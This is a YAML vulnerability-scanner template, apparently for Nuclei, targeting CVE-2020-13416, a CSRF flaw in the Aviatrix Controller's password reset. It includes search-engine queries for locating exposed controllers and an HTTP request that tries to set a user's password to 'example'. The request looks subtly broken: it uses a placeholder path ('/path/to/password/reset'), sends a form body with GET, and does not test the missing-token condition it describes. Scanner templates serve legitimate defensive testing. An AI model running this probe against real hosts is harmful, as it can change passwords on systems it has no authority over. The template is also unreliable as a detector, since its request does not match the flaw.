id: CVE-2020-13416

info:
  name: CSRF Vulnerability in Aviatrix Controller Password Reset
  author: ProjectDiscoveryAI
  severity: medium
  description: An issue was discovered in Aviatrix Controller before 5.4.1066. A Controller Web Interface session token parameter is not required on an API call, which opens the application up to a Cross Site Request Forgery (CSRF) vulnerability for password resets.
  impact: |
    An attacker can reset passwords of users without their consent.
  remediation: |
    Implement CSRF tokens and additional authentication checks for password reset functionality.
  reference:
    - https://docs.aviatrix.com/HowTos/security_bulletin_article.html#csrf-on-password-reset
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cve-id: CVE-2020-13416
    cwe-id: CWE-352
    epss-score: 0.00053
    epss-percentile: 0.23161
    cpe: cpe:2.3:a:aviatrix:controller:*:*:*:*:*:*:*:*
  metadata:
    vendor: aviatrix
    product: controller
    shodan-query: http.title:"Aviatrix Cloud Controller"
    fofa-query: title="aviatrix cloud controller"
    google-query: intitle:"aviatrix cloud controller"

http:
  - method: GET
    path:
      - "{{BaseURL}}/path/to/password/reset"

    headers:
      Content-Type: "application/x-www-form-urlencoded"

    body: "newpassword=example&confirmnewpassword=example"
    matchers:
      - type: word
        words:
          - "Password reset successfully"
        part: body
